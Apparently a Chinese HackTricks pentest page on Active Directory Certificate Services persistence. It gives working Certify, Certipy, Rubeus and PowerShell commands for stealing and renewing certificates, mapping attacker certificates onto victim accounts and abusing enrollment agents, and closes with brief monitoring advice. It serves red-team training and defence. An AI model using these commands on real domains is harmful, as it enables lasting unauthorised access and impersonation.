# AD CS 账户持久性

{{#include ../../../banners/hacktricks-training.md}}

**这是对[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)中精彩研究的账户持久性章节的小总结**

## 理解使用证书的活动用户凭证盗窃 – PERSIST1

在一个用户可以请求允许域身份验证的证书的场景中，攻击者有机会请求并窃取该证书，以在网络上保持持久性。默认情况下，Active Directory中的`User`模板允许此类请求，尽管有时可能会被禁用。

使用[Certify](https://github.com/GhostPack/Certify)或[Certipy](https://github.com/ly4k/Certipy)，您可以搜索允许客户端身份验证的启用模板，然后请求一个：
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
证书的力量在于它能够作为其所属用户进行身份验证，无论密码如何更改，只要证书保持有效。

您可以将 PEM 转换为 PFX 并使用它来获取 TGT：
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 注意：结合其他技术（见盗窃部分），基于证书的身份验证允许在不接触 LSASS 的情况下，甚至在非提升上下文中实现持久访问。

## 使用证书获得机器持久性 - PERSIST2

如果攻击者在主机上拥有提升的权限，他们可以使用默认的 `Machine` 模板为被攻陷系统的机器账户注册证书。作为机器进行身份验证使得本地服务能够使用 S4U2Self，并可以提供持久的主机持久性：
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 通过证书续订扩展持久性 - PERSIST3

滥用证书模板的有效性和续订周期使攻击者能够维持长期访问。如果您拥有先前颁发的证书及其私钥，您可以在到期之前续订它，以获得一个新的、长期有效的凭证，而不会留下与原始主体相关的额外请求痕迹。
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 操作提示：跟踪攻击者持有的 PFX 文件的生命周期并提前续订。续订还可以导致更新的证书包含现代 SID 映射扩展，使其在更严格的 DC 映射规则下保持可用（见下一节）。

## 植入显式证书映射 (altSecurityIdentities) – PERSIST4

如果您可以写入目标帐户的 `altSecurityIdentities` 属性，则可以将攻击者控制的证书显式映射到该帐户。这在密码更改后仍然有效，并且在使用强映射格式时，在现代 DC 执行下仍然保持功能。

高级流程：

1. 获取或颁发您控制的客户端身份验证证书（例如，以您自己身份注册 `User` 模板）。
2. 从证书中提取强标识符（Issuer+Serial、SKI 或 SHA1-PublicKey）。
3. 使用该标识符在受害者主体的 `altSecurityIdentities` 上添加显式映射。
4. 使用您的证书进行身份验证；DC 通过显式映射将其映射到受害者。 

示例（PowerShell）使用强 Issuer+Serial 映射：
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
然后使用您的 PFX 进行身份验证。 Certipy 将直接获取 TGT：
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
笔记
- 仅使用强映射类型：X509IssuerSerialNumber、X509SKI 或 X509SHA1PublicKey。弱格式（Subject/Issuer、仅主题、RFC822 电子邮件）已被弃用，并可能被 DC 策略阻止。
- 证书链必须构建到 DC 信任的根证书。NTAuth 中的企业 CA 通常是受信任的；某些环境也信任公共 CA。

有关弱显式映射和攻击路径的更多信息，请参见：

{{#ref}}
domain-escalation.md
{{#endref}}

## 作为持久性使用的注册代理 – PERSIST5

如果您获得有效的证书请求代理/注册代理证书，您可以随意代表用户铸造新的可登录证书，并将代理 PFX 离线作为持久性令牌。滥用工作流程：
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
撤销代理证书或模板权限是驱逐此持久性的必要条件。

## 2025 强证书映射强制执行：对持久性的影响

Microsoft KB5014754 在域控制器上引入了强证书映射强制执行。从2025年2月11日起，DC 默认采用完全强制执行，拒绝弱/模糊映射。实际影响：

- 缺乏 SID 映射扩展的 2022 年之前的证书在 DC 处于完全强制执行时可能会失败隐式映射。攻击者可以通过 AD CS 续订证书（以获取 SID 扩展）或在 `altSecurityIdentities` 中植入强显式映射（PERSIST4）来维持访问。
- 使用强格式（Issuer+Serial、SKI、SHA1-PublicKey）的显式映射继续有效。弱格式（Issuer/Subject、Subject-only、RFC822）可能会被阻止，应避免用于持久性。

管理员应监控并警报：
- 对 `altSecurityIdentities` 的更改以及 Enrollment Agent 和用户证书的签发/续订。
- CA 签发日志中的代表请求和异常续订模式。

## 参考文献

- Microsoft. KB5014754：Windows 域控制器上的基于证书的身份验证更改（强制执行时间表和强映射）。
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – 命令参考（`req -renew`、`auth`、`shadow`）。
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
